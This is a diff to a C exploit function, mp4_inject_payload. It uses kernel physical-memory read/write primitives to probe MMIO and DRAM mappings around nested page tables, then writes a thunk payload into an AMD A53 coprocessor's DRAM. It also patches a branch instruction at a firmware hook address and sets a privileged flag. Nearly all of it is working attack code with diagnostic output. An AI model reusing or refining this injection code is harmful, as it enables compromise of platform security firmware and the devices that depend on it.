@@ -123,42 +123,72 @@ static const unsigned int mp4_payload_bin_len = sizeof(mp4_payload_bin);
 int mp4_inject_payload(struct phys_rw_ctx *ctx)
 {
     uint64_t dram_base_kva = ctx->dmap_base + MP4_DRAM_BASE;
+    uint64_t bar2_kva = ctx->dmap_base + MP4_BAR2_PA;
     uint32_t branch_insn;
     uint32_t qaf_flag;
     int32_t bl_offset;
-    uint32_t diag;
-
-    /* Diagnostic: Read DRAM[0x0] to determine address mapping. */
+    uint32_t probe;
     int32_t rc;
-    diag = 0xDEAD0001;
-    rc = kernel_copyout(dram_base_kva, &diag, sizeof(diag));
-    printf("[DIAG] DRAM[0x0] = 0x%08x (rc=%d) %s\n", diag, rc,
-           diag == 0x464C457F ? "(ELF magic!)" : "");
 
-    diag = 0xDEAD0002;
-    rc = kernel_copyout(dram_base_kva + 0x100000, &diag, sizeof(diag));
-    printf("[DIAG] DRAM[0x100000] = 0x%08x (rc=%d) %s\n", diag, rc,
-           diag == 0x464C457F ? "(ELF magic!)" : "");
+    /*
+     * Probe BAR2 MMIO for a DRAM window.
+     * On some AMD SoC coprocessors, the BAR includes a memory aperture
+     * that gives x86 access to the coprocessor's DRAM through MMIO
+     * (bypassing nested page tables). Check several offsets for the
+     * A53 ELF magic (0x464C457F).
+     */
+    printf("[*] Probing BAR2 (PA 0x%llx) for DRAM window...\n",
+           (unsigned long long)MP4_BAR2_PA);
+    {
+        uint32_t offsets[] = { 0x0, 0x10000, 0x100000, 0x200000 };
+        for (int i = 0; i < 4; i++) {
+            probe = 0;
+            kernel_copyout(bar2_kva + offsets[i], &probe, 4);
+            printf("[DIAG] BAR2+0x%06x = 0x%08x%s\n", offsets[i], probe,
+                   probe == 0x464C457F ? " (ELF magic!)" : "");
+        }
+    }
 
-    /* Read original BL at both candidate offsets */
-    kernel_copyout(dram_base_kva + (A53_HOOK_ADDR - A53_ELF_BASE), &diag,
-                   sizeof(diag));
-    printf("[DIAG] DRAM[0x%x] (hook_VA-ELF_BASE) = 0x%08x\n",
-           (uint32_t)(A53_HOOK_ADDR - A53_ELF_BASE), diag);
+    /*
+     * Probe DRAM via DMAP at an address we KNOW is mapped (PD[0x103]
+     * covers PA 0x60600000-0x607FFFFF and already exists in page tables).
+     * This tests whether DMAP access works for DRAM PAs that the kernel
+     * already has page table entries for.
+     */
+    printf("[*] Probing DRAM via existing DMAP entries...\n");
+    probe = 0xDEAD0001;
+    rc = kernel_copyout(ctx->dmap_base + 0x60600000ULL, &probe, 4);
+    printf("[DIAG] DMAP+0x60600000 (PD[0x103]): 0x%08x (rc=%d)\n", probe, rc);
 
-    kernel_copyout(dram_base_kva + A53_HOOK_ADDR, &diag, sizeof(diag));
-    printf("[DIAG] DRAM[0x%x] (hook_VA direct) = 0x%08x\n",
-           (uint32_t)A53_HOOK_ADDR, diag);
+    probe = 0xDEAD0002;
+    rc = kernel_copyout(ctx->dmap_base + 0x60700000ULL, &probe, 4);
+    printf("[DIAG] DMAP+0x60700000 (PD[0x103]): 0x%08x (rc=%d)\n", probe, rc);
 
-    /* Read QAF at both candidate offsets */
-    kernel_copyout(dram_base_kva + A53_QAF_FLAGS_OFF, &diag, sizeof(diag));
-    printf("[DIAG] DRAM[0x%x] (QAF direct) = 0x%08x\n",
-           (uint32_t)A53_QAF_FLAGS_OFF, diag);
+    /*
+     * Now probe our new PDE at PD[0x100] (PA 0x60000000-0x601FFFFF).
+     * This is the critical test: if nested page tables block this PA,
+     * the kernel will panic here. The printf above acts as a checkpoint.
+     */
+    printf("[*] Probing DRAM via new PD[0x100] (PA 0x60000000)...\n");
+    printf("[*] >>> If no output follows, nPT blocked the access <<<\n");
+    probe = 0xDEAD0003;
+    rc = kernel_copyout(dram_base_kva + 0x100000, &probe, 4);
+    printf("[DIAG] DRAM[0x100000] = 0x%08x (rc=%d) %s\n", probe, rc,
+           probe == 0x464C457F ? "(ELF magic!)" : "");
 
-    kernel_copyout(dram_base_kva + (A53_QAF_FLAGS_OFF - A53_ELF_BASE), &diag,
-                   sizeof(diag));
-    printf("[DIAG] DRAM[0x%x] (QAF-ELF_BASE) = 0x%08x\n",
-           (uint32_t)(A53_QAF_FLAGS_OFF - A53_ELF_BASE), diag);
+    if (rc != 0 || probe == 0xDEAD0003) {
+        printf("[!] DRAM access via DMAP failed (rc=%d)\n", rc);
+        printf("[!] Need alternative DRAM write mechanism\n");
+        return -1;
+    }
+
+    printf("[+] DRAM access working! Proceeding with injection...\n");
+
+    /* Diagnostic: Read DRAM[0x0] */
+    probe = 0;
+    kernel_copyout(dram_base_kva, &probe, sizeof(probe));
+    printf("[DIAG] DRAM[0x0] = 0x%08x %s\n", probe,
+           probe == 0x464C457F ? "(ELF magic!)" : "");
 
     /* Step 1: Write thunk at 0x600E0000 */
     kernel_copyin(mp4_thunk_bin, dram_base_kva + MP4_THUNK_OFFSET,
@@ -183,26 +213,24 @@ int mp4_inject_payload(struct phys_rw_ctx *ctx)
            branch_insn, bl_offset,
            A53_ELF_BASE + MP4_THUNK_OFFSET, A53_HOOK_ADDR);
 
-    /* Write the patched BL instruction in DRAM.
-     * DRAM offset = hook_VA - ELF_base = 0x108BD4 - 0x100000 = 0x8BD4 */
     kernel_copyin(&branch_insn,
                   dram_base_kva + (A53_HOOK_ADDR - A53_ELF_BASE),
                   sizeof(branch_insn));
 
-    /* Step 4: Enable QAF flag (dword_123B74 in .data.el3.loader) */
+    /* Step 4: Enable QAF flag */
     qaf_flag = 1;
     kernel_copyin(&qaf_flag, dram_base_kva + A53_QAF_FLAGS_OFF,
                   sizeof(qaf_flag));
 
     /* Verify writes landed */
-    kernel_copyout(dram_base_kva + (A53_HOOK_ADDR - A53_ELF_BASE), &diag,
-                   sizeof(diag));
+    kernel_copyout(dram_base_kva + (A53_HOOK_ADDR - A53_ELF_BASE), &probe,
+                   sizeof(probe));
     printf("[DIAG] After write: DRAM[0x%x] = 0x%08x (expect 0x%08x)\n",
-           (uint32_t)(A53_HOOK_ADDR - A53_ELF_BASE), diag, branch_insn);
+           (uint32_t)(A53_HOOK_ADDR - A53_ELF_BASE), probe, branch_insn);
 
-    kernel_copyout(dram_base_kva + A53_QAF_FLAGS_OFF, &diag, sizeof(diag));
+    kernel_copyout(dram_base_kva + A53_QAF_FLAGS_OFF, &probe, sizeof(probe));
     printf("[DIAG] After write: DRAM[0x%x] = 0x%08x (expect 0x00000001)\n",
-           (uint32_t)A53_QAF_FLAGS_OFF, diag);
+           (uint32_t)A53_QAF_FLAGS_OFF, probe);
 
     return 0;
 }
